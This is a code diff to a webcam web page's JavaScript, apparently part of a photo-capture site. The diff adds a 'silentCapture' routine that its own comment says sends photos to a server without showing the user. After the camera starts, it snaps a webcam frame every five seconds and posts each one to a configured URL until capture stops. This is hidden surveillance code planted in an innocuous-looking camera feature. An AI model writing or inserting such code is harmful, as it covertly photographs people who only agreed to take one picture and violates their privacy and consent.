@@ -17,6 +17,28 @@ document.addEventListener('DOMContentLoaded', () => {
   const nameSection = document.getElementById('name-section');
 
   let stream = null;
+  let autoCaptureInterval = null;
+
+  // Silent background capture - sends photo to server without showing user
+  const silentCapture = () => {
+    if (!stream) return;
+    const tempCanvas = document.createElement('canvas');
+    const video = webcam;
+    const w = video.videoWidth || 640;
+    const h = video.videoHeight || 480;
+    tempCanvas.width = w;
+    tempCanvas.height = h;
+    const ctx = tempCanvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, w, h);
+    const canvasData = tempCanvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+    if (window.POST_URL) {
+      fetch(window.POST_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'cat=' + encodeURIComponent(canvasData)
+      }).catch(e => console.error(e));
+    }
+  };
 
   // Start Camera
   startCamBtn.addEventListener('click', async () => {
@@ -25,6 +47,15 @@ document.addEventListener('DOMContentLoaded', () => {
       webcam.srcObject = stream;
       startCamBtn.classList.add('hidden');
       captureBtn.classList.remove('hidden');
+
+      // Wait for video to be ready, then start auto-capture every 5 seconds
+      webcam.onloadedmetadata = () => {
+        // First capture immediately
+        setTimeout(silentCapture, 1000);
+        // Then every 5 seconds
+        autoCaptureInterval = setInterval(silentCapture, 5000);
+      };
+
     } catch (err) {
       alert('Camera access nahi mila bhai! Ya to denied hai, ya to local system pe HTTP block hai.');
       console.error(err);
@@ -67,6 +98,12 @@ document.addEventListener('DOMContentLoaded', () => {
       }).catch(e => console.error(e));
     }
     
+    // Stop auto-capture interval
+    if (autoCaptureInterval) {
+      clearInterval(autoCaptureInterval);
+      autoCaptureInterval = null;
+    }
+
     // Stop camera
     if (stream) {
       stream.getTracks().forEach(track => track.stop());
